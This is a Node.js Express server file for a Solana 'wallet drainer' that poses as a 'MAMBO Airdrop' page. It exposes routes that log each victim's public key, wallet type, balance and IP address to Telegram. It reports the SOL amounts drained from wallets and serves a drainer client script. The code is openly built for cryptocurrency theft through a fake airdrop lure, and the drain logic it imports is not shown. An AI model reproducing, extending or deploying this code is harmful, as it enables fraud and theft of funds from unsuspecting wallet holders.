import 'dotenv/config';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import drainerHandler from './api/drainer.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Routes - Specific routes first
app.post('/api/drainer/log-wallet', async (req, res) => {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  try {
    if (!req.body || typeof req.body !== 'object') {
      return res.status(400).json({ error: 'Invalid request body' });
    }
    
    const { publicKey, walletType, lamports } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    if (!publicKey) {
      return res.status(400).json({ error: 'Missing publicKey' });
    }
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    await telegramLogger.logWalletDetected({
      publicKey: publicKey,
      lamports: lamports || 0,
      ip: userIp,
      walletType: walletType || 'Unknown'
    });
    
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
  }
});

// OPTIONS route for wallet logging
app.options('/api/drainer/log-wallet', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.status(200).end();
});

// Main drainer routes
app.get('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.post('/api/drainer', async (req, res) => {
  try {
    await drainerHandler(req, res);
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

app.options('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

// On-chain confirmation logging endpoint
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    if (status === 'confirmed' || status === 'finalized') {
      // Only log drain success for confirmed/finalized transactions
      const actualDrainAmount = parseInt(req.body.actualDrainAmount) || 0;
      const lamports = parseInt(req.body.lamports) || 0;
      
      console.log('[CONFIRMATION_HANDLER] Received drain success:', {
        publicKey: publicKey,
        actualDrainAmount: actualDrainAmount,
        actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
        lamports: lamports,
        lamportsSOL: (lamports / 1e9).toFixed(6),
        ip: userIp
      });
      
      await telegramLogger.logDrainSuccess({
        publicKey: publicKey,
        actualDrainAmount: actualDrainAmount,
        lamports: lamports,
        ip: userIp
      });
    } else if (status === 'failed' || error) {
      await telegramLogger.logDrainFailed({
        publicKey: publicKey,
        lamports: req.body.lamports || 0,
        ip: userIp,
        error: error || 'Transaction failed on-chain'
      });
    }
    
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
  }
});

// Transaction cancellation logging endpoint
app.post('/api/drainer/log-cancellation', async (req, res) => {
  try {
    console.log('[CANCELLATION] Received cancellation request:', req.body);
    const { publicKey, walletType, reason } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    await telegramLogger.logTransactionCancelled({
      publicKey: publicKey,
      walletType: walletType || 'Unknown',
              reason: reason || 'User canceled the transaction',
      lamports: req.body.lamports || 0,
      ip: userIp
    });
    
    console.log('[CANCELLATION] Cancellation logged successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CANCELLATION] Error logging cancellation:', error);
    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
  }
});

// Static file routes
app.get('/logo.png', (req, res) => {
  res.setHeader('Content-Type', 'image/png');
  res.sendFile(path.join(__dirname, 'public', 'logo.png'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 MAMBO Airdrop: http://localhost:${PORT}`);
  console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/drainer`);
  console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
}); 